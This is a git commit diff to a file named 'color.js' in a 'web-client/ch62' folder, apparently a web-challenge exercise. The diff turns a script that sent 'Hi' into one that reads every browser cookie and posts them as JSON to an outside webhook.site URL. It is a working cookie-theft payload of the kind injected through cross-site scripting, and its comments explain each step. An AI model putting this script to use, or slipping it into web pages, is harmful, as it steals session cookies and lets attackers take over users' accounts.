4afb6b3721dca5b92d3c84fbd751a3c7647abd96
Brock-hash <73358677+Brock-hash@users.noreply.github.com>
2025-12-23 21:10:03 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,21 +1,31 @@
-var getCookies = function(){
+// Fonction pour récupérer les cookies
+var getCookies = function() {
   var pairs = document.cookie.split(";");
   var cookies = {};
-  for (var i=0; i<pairs.length; i++){
+  for (var i = 0; i < pairs.length; i++) {
     var pair = pairs[i].split("=");
-    cookies[(pair[0]+'').trim()] = unescape(pair.slice(1).join('='));
+    cookies[pair[0].trim()] = decodeURIComponent(pair.slice(1).join("="));
   }
   return cookies;
 }
-var myCookies = getCookies();
-var url = "https://webhook.site/cc3863eb-0c66-40a6-88d7-a4cb0ee9b5f1" // Webhook URL
-var text = {content: "Hi"}
 
-fetch(url, 
-  {
-    method: “POST”,
-    headers: {“Content-Type”: “application/json”},
-    body: JSON.stringify(text),
-  }
-)
-  .then();
+var myCookies = getCookies();
+
+// Webhook URL
+var url = "https://webhook.site/cc3863eb-0c66-40a6-88d7-a4cb0ee9b5f1";
+
+// Corps de la requête avec les cookies
+var data = {
+  content: "Hi",
+  cookies: myCookies
+};
+
+// Envoi de la requête
+fetch(url, {
+  method: "POST",
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify(data)
+})
+.then(response => response.text())
+.then(console.log)
+.catch(console.error);
